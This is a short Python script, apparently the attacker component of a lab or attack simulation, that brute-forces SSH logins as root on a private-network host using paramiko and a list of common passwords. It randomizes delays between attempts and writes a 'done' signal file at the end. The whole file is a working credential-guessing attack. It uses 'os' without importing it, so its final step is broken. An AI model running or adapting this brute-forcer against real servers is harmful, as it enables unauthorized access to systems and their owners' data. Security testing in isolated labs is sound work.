import paramiko
import time
import random

def ssh_bruteforce(hostname, username, passwords):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in passwords:
        try:
            client.connect(hostname, username=username, password=password, timeout=3)
            print(f"Successful login: {username}:{password}")
            client.close()
            return
        except paramiko.AuthenticationException:
            print(f"Failed attempt: {username}:{password}")
        except Exception as e:
            print(f"Error: {str(e)}")
        time.sleep(random.uniform(0.1, 0.5))

    print("Brute force attack completed")

if __name__ == "__main__":
    hostname = "172.16.238.12"
    username = "root"
    passwords = ["password123", "admin", "root", "123456", "password","securepassword","verysecurepassword"]  # Example password list
    ssh_bruteforce(hostname, username, passwords)

    simulation_id = os.environ.get('SIMULATION_ID', 'unknown')
    with open(f'/signals/attacker_done_{simulation_id}', 'w') as f:
        f.write('done')
